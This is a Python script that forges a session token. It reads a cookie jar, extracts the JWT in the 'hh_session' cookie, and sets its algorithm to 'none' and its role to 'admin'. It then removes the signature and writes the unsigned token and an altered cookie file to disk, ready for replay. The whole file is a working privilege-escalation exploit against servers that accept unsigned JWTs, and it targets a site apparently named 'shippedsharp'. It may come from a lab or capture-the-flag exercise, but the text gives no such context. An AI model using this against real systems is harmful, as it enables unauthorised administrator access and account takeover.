import base64
import json
from pathlib import Path


SOURCE_COOKIE_FILE = Path("shippedsharp_cookies.txt")
ADMIN_COOKIE_FILE = Path("shippedsharp_admin_cookies.txt")
ADMIN_TOKEN_FILE = Path("admin_jwt.txt")


def b64url_decode(value):
    value += "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(value)


def b64url_encode_json(value):
    raw = json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


lines = SOURCE_COOKIE_FILE.read_text().splitlines()
token = None
session_index = None

for index, line in enumerate(lines):
    if not line.strip():
        continue

    if line.startswith("#") and not line.startswith("#HttpOnly_"):
        continue

    parts = line.split("\t")
    if len(parts) >= 7 and parts[5] == "hh_session":
        token = parts[6].strip()
        session_index = index
        break

if not token:
    raise SystemExit("hh_session cookie not found")

header_b64, payload_b64, signature_b64 = token.split(".")
original_header = json.loads(b64url_decode(header_b64))
original_payload = json.loads(b64url_decode(payload_b64))

admin_header = dict(original_header)
admin_payload = dict(original_payload)
admin_header["alg"] = "none"
admin_payload["role"] = "admin"

admin_token = (
    b64url_encode_json(admin_header)
    + "."
    + b64url_encode_json(admin_payload)
    + "."
)

ADMIN_TOKEN_FILE.write_text(admin_token + "\n")

admin_lines = list(lines)
parts = admin_lines[session_index].split("\t")
parts[6] = admin_token
admin_lines[session_index] = "\t".join(parts)
ADMIN_COOKIE_FILE.write_text("\n".join(admin_lines) + "\n")

print("=" * 60)
print("ORIGINAL JWT")
print("=" * 60)
print("Header:")
print(json.dumps(original_header, indent=2))
print("\nPayload:")
print(json.dumps(original_payload, indent=2))
print("\nSignature present:", bool(signature_b64))
print("Algorithm:", original_header.get("alg"))
print("Role:", original_payload.get("role"))

print("\n" + "=" * 60)
print("UNSIGNED ADMIN JWT")
print("=" * 60)
print("Header:")
print(json.dumps(admin_header, indent=2))
print("\nPayload:")
print(json.dumps(admin_payload, indent=2))
print("\nSignature present: False")
print("Algorithm:", admin_header.get("alg"))
print("Role:", admin_payload.get("role"))
print("Admin token ends with dot:", admin_token.endswith("."))
print("Token saved to:", ADMIN_TOKEN_FILE)
print("Admin cookie jar saved to:", ADMIN_COOKIE_FILE)
